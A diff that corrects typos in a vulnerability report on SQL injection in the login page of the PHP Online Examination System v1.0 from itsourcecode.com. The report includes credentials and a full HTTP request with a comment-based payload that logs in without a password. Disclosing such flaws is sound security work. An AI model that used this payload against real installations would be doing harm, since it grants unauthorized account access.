@@ -1,4 +1,4 @@
-# Onlin Examination System v1.0 by itsourcecode.com has SQL injection
+# Online Examination System v1.0 by itsourcecode.com has SQL injection
 **Vul_Author:** Wenxun Wang
 
 **vendors:** https://itsourcecode.com/free-projects/php-project/online-examination-system-in-php/
@@ -14,7 +14,7 @@
 
 **Correct username and password:** username=jane@gmail.com&pass=jane
 
-**Request package**：try to login without password
+**Request package**：try to log in without password
 
 ```
 POST /Online/query/loginExe.php HTTP/1.1
@@ -40,7 +40,7 @@ Connection: close
 username=jane@gmail.com'#&pass=
 ```
 
-**SQL injection result**：(line 12 of the resonse) login successfully without password
+**SQL injection result**：(line 12 of the response) login successfully without password
 
-![sql_injection](https://github.com/iknownt/bug_report/blob/main/vendors/itsourcecode.com/Onlin-Examination-System/images/sql_injection1.png)
+![sql_injection](https://github.com/iknownt/bug_report/blob/main/vendors/itsourcecode.com/Online-Examination-System/images/sql_injection1.png)
 
